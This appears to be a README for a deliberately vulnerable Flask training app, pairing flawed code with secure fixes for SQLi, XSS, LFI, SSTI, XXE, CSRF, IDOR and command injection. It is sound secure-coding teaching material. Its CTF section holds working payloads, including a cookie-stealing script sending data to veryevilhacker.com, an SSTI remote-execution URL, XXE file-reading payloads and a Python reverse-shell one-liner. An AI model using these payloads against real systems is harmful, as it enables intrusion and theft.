## Insecure Session Management
In auth.py, a session cookie is being set without a httponly flag. This allows a javascript to access this data. Since this can be chained with an attack such as a XSS, this might raise the risk.


```python
response = make_response(redirect(url_for('views.home')))
                response.set_cookie('cookie', str(uuid.uuid4()))

                return response
```


Secure Code:


```python
response.set_cookie('cookie', str(uuid.uuid4()), httponly=True)
```
You should also set the follwoing inside the init file.

```python
SESSION_COOKIE_SECURE = True

```

## SQLi
## vuln code:
- In auth.py, email and password data is being handled unsecurely when querying. 
```python
def login():
    if request.method =='POST':
        email = request.form.get('email')
        password = request.form.get('password')

        query = text("SELECT * FROM user WHERE email = '%s' AND password = '%s' "% (email,password))
        results = db.session.execute(query).all()
        if results:
            for result in results:
                flash('Logged in successfully!', category='success')
                user = User.query.filter_by(password=result.password).first()

                login_user(user, remember=True)

                return redirect(url_for('views.home'))
        else:
            flash('Incorrect password, try again.', category='error')

    return render_template("login.html", user=current_user)

```

## secure code
## use a parameterized statement for sql alchemy

```python
@auth.route('/login', methods=['GET', 'POST'])
def login():
    if request.method =='POST':
        email = request.form.get('email')
        password = request.form.get('password')

        query = text("SELECT * FROM user WHERE email = :email AND password = :password")
        results = db.session.execute(query,{"email": email, "password": password}).all()

        if results:
                for result in results:

                    flash('Logged in successfully!', category='success')
                    user = User.query.filter_by(password=result.password).first()


                    login_user(user, remember=True)

                    return redirect(url_for('views.home'))
        else:
            flash('Incorrect password, try again.', category='error')


    return render_template("login.html", user=current_user)

```
## LFI

In auth.py, argument, "file" is being handled unsafely without any sanitization. 

```python
import os
from flask import send_file

auth = Blueprint('auth', __name__)
# LFI vuln code
asset_folder = "templates"
@auth.route('/find_secret', methods=['GET', 'POST'])
def get_asset():
    asset_name = request.args.get('file')
    if not asset_name:
        return render_template("find_secret.html",user=current_user)
    return send_file(os.path.join(asset_folder, asset_name))
```

## secure code:

Use werkzeug's secure_filename module to return the secure version of the file name, which removes any dangerous LFI attack vectors such as "/" or "\", and replaced them with underscores. 
```python
from werkzeug.utils import secure_filename

auth = Blueprint('auth', __name__)
asset_folder = "templates"
@auth.route('/find_secret', methods=['GET', 'POST'])
def get_asset():

    asset_name = request.args.get('file')
    if not asset_name:
        return render_template("find_secret.html",user=current_user)
    asset_name = secure_filename(asset_name)
    return send_file(os.path.join(asset_folder, asset_name))

```


## RCE:
Vulnerable Code:

``` python 
@auth.route("/ping", methods=['GET', 'POST'])
def page():
    if request.method == 'POST':
        hostname = request.form.get('hostname')
        cmd = 'ping ' + hostname
        return subprocess.check_output(cmd, shell=True)
    else:
        return render_template("ping.html",user=current_user)

```





Secure code:
- Setting shell as True to pass the command as single string introduces the vulnerability.
- Passing the command as a list of arguments is the safer approach that should always be used.
- proper error handling will ensure that the application is not showing the backend information.


```python
@auth.route("/ping", methods=['GET', 'POST'])
def page():
    if request.method == 'POST':
        hostname = request.form.get('hostname')
        try:
            subprocess.check_output(['ping', hostname], shell=False)
            return  "<p> ping was successful. host is up! </p>"
        except:
            return render_template("ping.html",user=current_user)
    else:
        return render_template("ping.html",user=current_user)


```

## Reflected XSS

## pickPartner endpoint is vulnerable to reflected XSS.

Auth.py shows the server is getting the buddy parameter from both the POST request and from the URL parameter and pass the "buddy" variable to the pickPartner.html template.
```python
@auth.route("/pickPartner", methods=['GET', 'POST'])
def partner():
    if request.method == 'POST':
        buddy = request.form.get('buddy')
        return render_template("pickPartner.html",user=current_user, buddy=buddy)
    else:
        buddy = request.args.get('buddy')
        return render_template("pickPartner.html",user=current_user, buddy=buddy)

```




PickPartner.html:

- the template is using "| safe" method which disables the HTML encoding.
```html

<form method="POST">
  <div class="form-group">
       <label for="buddy">Pick a great name!</label>
       <input class="form-control" id="buddy" name="buddy" placeholder="Pikachu"/>

  </div>


  <br>
  <button type=submit" class="btn btn-success">I CHOOSE YOU!</button>

      <br>
      <br>
      <br>
      <br>
      <br>
      <br>
      <br>
 </form>
<br>
<br>
 {% if buddy %}

<h3> {{ buddy | safe }} </h3>
 {% endif %}


<p>buddy's image changes if you supply another name. </p>

```


SECURE CODE:

- simply remove the "| safe" from the template to resolve this vulnerability.

## Stored XSS:

### vuln code
### views.py


```python
@views.route('/', methods=['GET', 'POST'])
@login_required
def home():
    if request.method == 'POST':
        note = request.form.get('note')#Gets the note from the HTML

        if len(note) < 1:
            flash('Note is too short!', category='error')
        else:
            new_note = Note(data=note, user_id=current_user.id)  #providing the schema for the note
            db.session.add(new_note) #adding the note to the database
            db.session.commit()

            flash('Note added!', category='success')


    query = text(f"SELECT * FROM note where user_id = {current_user.id}")

    results = db.session.execute(query).all()
    rows = []
    if results:
        for note in results:
            rows.append("""<li class="list-group-item"> %s
                <button type="button" class="close" onClick="deleteNote(%s)">
                  <span aria-hidden="true">&times;</span>
                </button>
              </li>""" % (note[1], note.id))


    return render_template("home.html", user=current_user, rows=rows)
```

### home.html
```html
{% extends "base.html" %} {% block title %}Home{% endblock %} {% block content
%}
<h1 align="center">Notes</h1>
<ul class="list-group list-group-flush" id="notes">
    {% for row in rows %}

    {{ row|safe }}

    {% endfor %}
</ul>
<form method="POST">
  <textarea name="note" id="note" class="form-control"></textarea>
  <br />
  <div align="center">
    <button type="submit" class="btn btn-primary">Add Note</button>
  </div>
</form>
{% endblock %}

```

### Secure code:
#### views.py

```python
@views.route('/', methods=['GET', 'POST'])
@login_required
def home():
    if request.method == 'POST':
        note = request.form.get('note')#Gets the note from the HTML

        if len(note) < 1:
            flash('Note is too short!', category='error')
        else:
            new_note = Note(data=note, user_id=current_user.id)  #providing the schema for the note
            db.session.add(new_note) #adding the note to the database
            db.session.commit()

            flash('Note added!', category='success')


    query = text(f"SELECT * FROM note where user_id = {current_user.id}")
    results = db.session.execute(query).all()


    return render_template("home.html", user=current_user, rows=results)

```

#### home.html
```html
{% extends "base.html" %} {% block title %}Home{% endblock %} {% block content
%}
<h1 align="center">Notes</h1>
<ul class="list-group list-group-flush" id="notes">
    {% for row in rows %}
    <li class="list-group-item">
    {{ row['data'] }}
    <button type="button" class="close" onClick="deleteNote({{ row['id'] }})">
      <span aria-hidden="true">&times;</span>
    </button>
    </li>


    {% endfor %}
</ul>
<form method="POST">
  <textarea name="note" id="note" class="form-control"></textarea>
  <br />
  <div align="center">
    <button type="submit" class="btn btn-primary">Add Note</button>
  </div>
</form>
{% endblock %}

```
### Security Misconfiguration + RCE


#### Vulnerable code:
Inside the login page, there's a comment that mentions /oauth endpoint that's under development. When a User visits this page, it shows an error. 

html comment:
```html

<!--TO DO: /oauth endpoint is under development-->
```

In auth.py, there's the /oauth path that triggers an error. 

```python
@auth.route('/oauth')
def login_oauth():
    # TODO implement this later...
    raise Exception('Not Implemented')
```

Main.py shows the app is running in debug mode. 

```python
app.run(debug=True,host="0.0.0.0", port=8080)
```

.env file is disabling the debug PIN which is a feature that adds additional security when a debug mode gets pushed to the prod.

```python
WERKZEUG_DEBUG_PIN = off
```


### Secure Coding

1. Do not push anything that's under development to prod including the TO DO comment in the html and /oauth route inside the auth.py file.

2. Do not run the app in prod with a debug mode. Instead, use the following to run it.

```python
from waitress import serve
    serve(app, host="0.0.0.0", port=8080)
```

3. Remove the offending line in the .env file to enable the debug PIN.



## IDOR 


### Vulnerable code:

In auth.py, it's not verifying whether the user is able to view other users' data or not. Thus, an attacker can access anyone's data if they are logged-in.

```python
@auth.route('/users', methods=['GET'])
@login_required
def get_user_data():
    user_id = request.args.get('id')
    user_exists = False
    query = text("SELECT * FROM user WHERE id = :user_id")
    results = db.session.execute(query, {"user_id": user_id}).all()
    user_dict = {'id': "null", 'email': "null"}
    if results:
        user_exists = True
        id_value = results[0][0]
        email_value = results[0][1]

        user_dict['id'] = id_value
        user_dict['email'] = email_value

    return jsonify(user_dict)



```

### Secure Code:

With this application, you can retrieve the user's id value with current_user.id. Using this, we can simply check if the current user's id matches with the id value provided with the URL argument. 
```python
@auth.route('/users', methods=['GET'])
@login_required
def get_user_data():
    user_id = request.args.get('id')
    if int(user_id) == int(current_user.id):

        query = text("SELECT * FROM user WHERE id = :user_id")
        results = db.session.execute(query, {"user_id": user_id}).all()
        user_dict = {'id': "null", 'email': "null"}
        if results:
            id_value = results[0][0]
            email_value = results[0][1]

            user_dict['id'] = id_value
            user_dict['email'] = email_value

        return jsonify(user_dict)
    else:
        not_allowed = {'message': "You are not allowed to see this user's data"}
        return jsonify(not_allowed)
```

## CSRF:

Vuln Code:


In auth.py, notice change_email function doesn't pass any CSRF token.
```python
@auth.route("/change_email", methods=['POST'])
@login_required
def change_email():
    current_email = current_user.email
    email = request.form.get('email')

    return f"<h1> Your Email has been changed to {email} from {current_email} ! (This is a simulation) <h1>"

```

In home.html, there's no csrf being submitted.
```html
<div class="card">
  <div class="card-header">
    Update your Email Address
  </div>
  <div class="card-body">
    <form action="/change_email" method="post">
  <!-- ... -->
    <h2>Enter a new email address below:</h2>
    <input class="form-control" id="email" name="email" placeholder="email"/>
    <br>
    <button type="submit" class="btn btn-danger">Change my email address!</button>
</form>
  </div>
</div>

```

SECURE CODE:

Note that anti_csrf_token was already assigned via home function:

```python
session['anti_csrf_token'] = str(uuid.uuid4())
....

return render_template("home.html", user=current_user, rows=rows, anti_csrf_token=session['anti_csrf_token'])
```

Adjust the change_email function and pass the anti_csrf_token with additional checks on token's validity.

```python
def change_email():
    current_email = current_user.email
    email = request.form.get('email')


    anti_csrf_token = request.form.get("anti_csrf_token")
    try:
        if session['anti_csrf_token'] != anti_csrf_token:
            print(f"database csrf token was: {session['anti_csrf_token']} " +
                f"csrf token submitted by the form was {anti_csrf_token} ")
            return "Error, wrong anti CSRF token", 401
        else:
            return f"<h1> Your Email has been changed to {email} from {current_email} ! (This is a simulation) <h1>"
    except:
        return "CSRF token is missing!", 401

```

Finally, in home.html, supply a hidden anti_csrf_token input field:
```html
<div class="card">
  <div class="card-header">
    Update your Email Address
  </div>
  <div class="card-body">
    <form action="/change_email" method="post">
  <!-- ... -->
    <h2>Enter a new email address below:</h2>
    <input class="form-control" id="email" name="email" placeholder="email"/>
    <input type="hidden" name="anti_csrf_token" value="{{anti_csrf_token}}">
    <br>
    <button type="submit" class="btn btn-danger">Change my email address!</button>
</form>
  </div>
</div>

```

## SSTI:


### Vuln Code:

-- this also leads to a RCE. Check out the ctf_solutions.txt

in auth.py:
```python
@auth.route('/find_secret', methods=['GET', 'POST'])
def get_asset():

    asset_name = request.args.get('file')

    if not asset_name:
        return render_template("find_secret.html",user=current_user)
    try:
        return send_file(os.path.join(asset_folder, asset_name))
    except:
        return render_template_string("""
    <h2 style="background-color:powderblue;">
    404 page not found:
    </h2>
  <h3>
  the
   '""" + asset_name + """' resource does not exist!
  </h3>""", user=current_user), 404


```
--- it's processing user-supplied parameter (file) and concatenating it with a template string unsafely.


### Secure Code:


```python

    except:
        return render_template_string("404 page not found: the {{ asset_name }} resource does not exist!", user=current_user, asset_name=asset_name), 404

```

- pass the variable inside {{}} which flask safely handles the template data. Don't forget to supply the keyword arguments with asset_name=asset_name!

## XXE: 

In the auth.py file, take a look at the is_xml endpoint being configured.

Vulnerable code:

```python
@tools.route("/is_xml", methods=['POST'])
def tools_is_xml():
    try:
        # read data from POST
        xml_raw = request.files['xml'].read()

        # create the XML parser
        parser = etree.XMLParser()

        # parse the XML data
        root = etree.fromstring(xml_raw, parser)

        # return a string representation
        xml = etree.tostring(root, pretty_print=True, encoding='unicode')
        return jsonify({'status': 'yes', 'data': xml})
    except Exception as e:
        return jsonify({'status': 'no', 'message': str(e)})

```

Simply add the "resolve_entities=False" argument when creating the etree.XMLParser.


```python
parser = etree.XMLParser(resolve_entities=False)
```

# CTF

### LFI challenge

http://127.0.0.1:8080/find_secret?file=..\..\..\secrets.txt


### SQLi:

enter "' OR 'a'='a';--" inside the Email Address field

### XSS stored:

After logging in as a user,
Add a note such as "<script> alert(1) </script>"

Due to the insecure session management, an attacker can also retrieve the session data of the logged-in user with
the following script.

```
<script>document.location='http://veryevilhacker.com?cookie='+document.cookie</script>
```

An attacker hosting the malicious site can look at the log data and sees the user's cookie value to authenticate as the user.


### Command injection:


go to http://127.0.0.1:8080/ping and

enter "127.0.0.1 | whoami"


### XSS Reflected:


### SSTI:

Vulnerable Endpoint: http://127.0.0.1:8080/find_secret?file=

If you supply a file name that doesn't exist on the backend, it shows an error such as "404 page not found: the resource does not exist!".

Since the template is being used insecurely, it's vulnerable to SSTI.

Simply supply {{ 7 * 7 }} for the file parameter and observe it returns 49.

We can also achieve a RCE with: (reveals the files in the current directory)

```
http://127.0.0.1:8080/find_secret?file={%%20for%20x%20in%20().__class__.__base__.__subclasses__()%20%}{%%20if%20%22warning%22%20in%20x.__name__%20%}{{x()._module.__builtins__[%27__import__%27](%27os%27).popen(%22dir%22).read()}}{%endif%}{%%20endfor%20%}
```


### CSRF attack

After logging in, there's a functionality to change the current user's email.

Since the CSRF token is not implemented, attacker can craft a payload and put it inside a website to trick a user to visit the site, then submit a form to change the logged-in user's email to whatever the email attacker specifies it as.
Payload:
```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>

```

#### XXE

The login page shows there's an endpoint /is_xml where a user can send a post request containing an XML file with a key:xml to check if the file is valid.
This function is vulnerable to an XXE attack.

sample payload:

Linux:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<items>
    <name>&xxe;</name>
    <price>100</price>

</items>

```


Windows:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">]>
<items>
    <name>&xxe;</name>
    <price>100</price>

</items>
```

Upload the xml file via a POSTMAN by choosing the "form-data" option and specify the Key as "xml" and select the payload file.


### IDOR 

A logged-in user is able to enumerate other user's email addresses at /users?id=ID_NUMBER.
Essentially, any logged_in user can enumerate all the users' email addresses by going through the id values.

### Security Misconfiguration + RCE

Inside the login page, there's a comment that mentions /oauth endpoint that's under development. When a User visits this page, it shows an error.

html comment:
```html

<!--TO DO: /oauth endpoint is under development-->
```
The error page shows the flask debugger has been pushed to production and a PIN is disabled.  An attacker can open a python interactive shell by clicking the command line icon.

With python, an attacker can obtain a reverse shell or issue any command. 

Simple Command POC that opens a calculator on the target system: 
```python
#Windows
os.system('calc')
#Linux 
os.system('xcalc')
```

Reverse shell command POC:

Adjust the IP and the port for demo.
```python
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```
